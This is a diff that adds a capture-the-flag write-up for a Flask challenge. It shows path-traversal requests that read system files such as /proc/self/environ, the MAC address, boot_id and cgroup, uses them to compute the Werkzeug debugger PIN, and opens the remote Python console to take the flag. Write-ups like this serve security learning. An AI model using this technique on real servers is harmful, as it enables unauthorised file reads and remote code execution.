@@ -1,0 +1,70 @@
+http://chal.b01lers.com:5000/?animal=a
+	Error
+
+Werkzeug debugger
+
+http://chal.b01lers.com:5000/console
+	need PIN
+
+http://chal.b01lers.com:5000/?animal=/proc/self/environ
+	HOSTNAME=e8c9f0084a3b
+	USER=loremipsum
+	PWD=/home/loremipsum
+	HOME=/home/loremipsum
+	SHLVL=1
+	PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin_=/usr/bin/timeout
+	WERKZEUG_SERVER_FD=3WERKZ
+
+No PIN, we have to calculate
+	Source: 
+		https://www.daehee.com/werkzeug-console-pin-exploit/
+		https://github.com/pallets/werkzeug/blob/master/src/werkzeug/debug/__init__.py
+
+# Get internet interface device id
+http://chal.b01lers.com:5000/?animal=/proc/net/arp
+	IP address       HW type     Flags       HW address            Mask     Device
+	172.27.0.1       0x1         0x2         02:42:d6:ab:12:00     *        eth0
+
+# Get MAC Address
+http://chal.b01lers.com:5000/?animal=/sys/class/net/eth0/address
+	02:42:ac:1b:00:02
+
+
+	Convert to decimal
+
+	0x0242ac1b0002 => 2485378547714
+
+
+# Get machine id, it uses the first not empty file of /etc/machine-id and /proc/sys/kernel/random/boot_id. After that it appends part of the first line of /proc/self/cgroup.
+	
+http://chal.b01lers.com:5000/?animal=/etc/machine-id
+	empty
+
+http://chal.b01lers.com:5000/?animal=/proc/sys/kernel/random/boot_id
+	b875f129-5ae6-4ab1-90c0-ae07a6134578
+
+http://chal.b01lers.com:5000/?animal=/proc/self/cgroup
+	11:memory:/docker/e8c9f0084a3b2b724e4f2a526d60bf0a62505f38649743b8522a8c005b8334ae
+	10:blkio:/docker/e8c9f0084a3b2b724e4f2a526d60bf0a62505f38649743b8522a8c005b8334ae
+	9:cpuset:/docker/e8c9f0084a3b2b724e
+
+python3
+	b"11:memory:/docker/e8c9f0084a3b2b724e4f2a526d60bf0a62505f38649743b8522a8c005b8334ae".strip().rpartition(b"/")[2]
+
+	=> b'e8c9f0084a3b2b724e4f2a526d60bf0a62505f38649743b8522a8c005b8334ae'
+
+python3 pingen.py
+	126-739-410
+
+http://chal.b01lers.com:5000/console
+	get a python shell
+
+b0ctf{Fl4sK_d3buG_is_InseCure}
+
+
+
+
+======================= Another way to get PIN =======================
+1. Access "http://chal.b01lers.com:5000/?animal=error" (Cause error, animal can be anything)
+2. Access "http://chal.b01lers.com:5000/?animal=/proc/self/fd/2"
+3. Press "Open console" on "http://chal.b01lers.com:5000/?animal=error"
